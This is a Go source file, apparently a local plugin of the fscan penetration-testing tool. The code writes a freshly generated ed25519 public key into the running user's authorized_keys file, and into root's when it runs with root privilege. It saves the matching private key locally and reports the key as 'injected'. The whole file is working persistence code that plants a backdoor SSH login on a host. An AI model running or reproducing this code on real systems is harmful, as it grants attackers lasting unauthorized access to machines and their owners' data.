//go:build (plugin_sshkey || !plugin_selective) && !windows && !no_local

package local

import (
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/pem"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"strings"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
	"golang.org/x/crypto/ssh"
)

type SSHKeyPlugin struct {
	plugins.BasePlugin
}

func NewSSHKeyPlugin() *SSHKeyPlugin {
	return &SSHKeyPlugin{BasePlugin: plugins.NewBasePlugin("sshkey")}
}

func (p *SSHKeyPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
	var output strings.Builder
	var successCount int

	targets := p.getTargetUsers()

	for _, u := range targets {
		sshDir := filepath.Join(u.HomeDir, ".ssh")
		authFile := filepath.Join(sshDir, "authorized_keys")

		if err := os.MkdirAll(sshDir, 0700); err != nil {
			output.WriteString(i18n.Tr("sshkey_mkdir_failed", u.Username, err) + "\n")
			continue
		}

		pubKey, privKey, err := p.generateKeyPair()
		if err != nil {
			output.WriteString(i18n.Tr("sshkey_generate_failed", u.Username, err) + "\n")
			continue
		}

		// 追加公钥到 authorized_keys
		existing, err := os.ReadFile(authFile)
		if err != nil && !os.IsNotExist(err) {
			output.WriteString(i18n.Tr("sshkey_authorized_read_failed", u.Username, err) + "\n")
			continue
		}
		if strings.Contains(string(existing), pubKey) {
			output.WriteString(i18n.Tr("sshkey_public_exists", u.Username) + "\n")
			continue
		}

		entry := pubKey + "\n"
		f, err := os.OpenFile(authFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
		if err != nil {
			output.WriteString(i18n.Tr("sshkey_authorized_write_failed", u.Username, err) + "\n")
			continue
		}
		_, err = f.WriteString(entry)
		f.Close()
		if err != nil {
			continue
		}

		// 保存私钥到当前目录
		keyFile := fmt.Sprintf("id_%s_%s", u.Username, "ed25519")
		if err := os.WriteFile(keyFile, []byte(privKey), 0600); err != nil {
			output.WriteString(i18n.Tr("sshkey_private_save_failed", u.Username, err) + "\n")
			continue
		}

		output.WriteString(i18n.Tr("sshkey_injected", u.Username, authFile, keyFile) + "\n")
		successCount++
	}

	if successCount > 0 {
		session.LogSuccess(i18n.Tr("sshkey_success", successCount))
	}

	return &plugins.Result{
		Success: successCount > 0,
		Type:    plugins.ResultTypeService,
		Output:  output.String(),
	}
}

func (p *SSHKeyPlugin) getTargetUsers() []*user.User {
	var targets []*user.User

	if u, err := user.Current(); err == nil {
		targets = append(targets, u)
	}

	// root 权限下额外注入 root 用户
	if os.Getuid() == 0 {
		if root, err := user.Lookup("root"); err == nil {
			targets = append(targets, root)
		}
	}

	return targets
}

func (p *SSHKeyPlugin) generateKeyPair() (pubKeyStr, privKeyStr string, err error) {
	pub, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		return "", "", err
	}

	sshPub, err := ssh.NewPublicKey(pub)
	if err != nil {
		return "", "", err
	}
	pubKeyStr = strings.TrimSpace(string(ssh.MarshalAuthorizedKey(sshPub)))

	privBytes, err := ssh.MarshalPrivateKey(priv, "")
	if err != nil {
		return "", "", err
	}
	privKeyStr = string(pem.EncodeToMemory(privBytes))

	return pubKeyStr, privKeyStr, nil
}

func init() {
	RegisterLocalPlugin("sshkey", func() Plugin {
		return NewSSHKeyPlugin()
	})
}
